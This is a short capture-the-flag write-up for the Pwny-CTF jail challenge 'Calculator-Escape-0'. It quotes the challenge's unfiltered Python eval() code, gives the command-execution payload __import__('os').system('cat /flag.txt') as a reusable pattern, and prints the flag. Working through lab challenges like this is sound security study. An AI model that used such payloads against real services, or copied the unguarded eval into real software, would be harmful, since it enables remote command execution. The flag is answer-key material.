---
title: "Calculator-Escape-0"
ctf: "Pwny-CTF"
category: "misc"
difficulty: "Not specified"
points: 25
techniques: ["jail-escape", "pyjail"]
tools: ["netcat"]
keywords: ["Calculator-Escape-0", "Pwny-CTF", "misc", "jail-escape", "pyjail", "netcat"]
status: "solved"
has_script: false
source: "Pwny-CTF/CHALLENGES/Jail/Calculator-Escape-0/notes.md"
---

# Calculator-Escape-0 (Pwny-CTF, misc)

## Summary
Challenge **Calculator-Escape-0** from the Pwny-CTF CTF, misc category. Main technique: jail-escape. The flag: sigpwny{now_you_know_what_to_do!}

## Statement and artefacts
Can you pwn this calculator challenge and read /flag.txt? Look at chal.py for hints!

`nc chal.sigpwny.com 7001`

**author**: Nathan

**Provided files / artifacts:**
- `work/info.txt (text, 430 B)`

## Recognition signals
- Signal: eval(s) evaluates any provided Python expression.

## Resolution method
1. Read `chal.py` → `is_input_bad` always returns `False`, `eval` without guardrail.
2. Input: `__import__('os').system('cat /flag.txt')` → `__import__('os')` imports module `os` **as an expression** (impossible to write `import os` in a `eval`), then `.system(...)` launches the command.

1. **Flaw (source)**

```python
def is_input_bad(s):
    return False          # we allow everything
...
print('Answer: {}'.format(eval(s)))
```
`eval(s)` evaluates any supplied Python **expression**.

## Flag
sigpwny{now_you_know_what_to_do!}

## Lessons and reusable patterns
- eval only accepts an expression, no statement (import, =). To import: __import__('os').
- Basic universal payload for an open eval/exec: __import__('os').system('cat /flag.txt').
- eval returns the value; os.system returns the return code (here 0) displayed after the flag, this is normal.
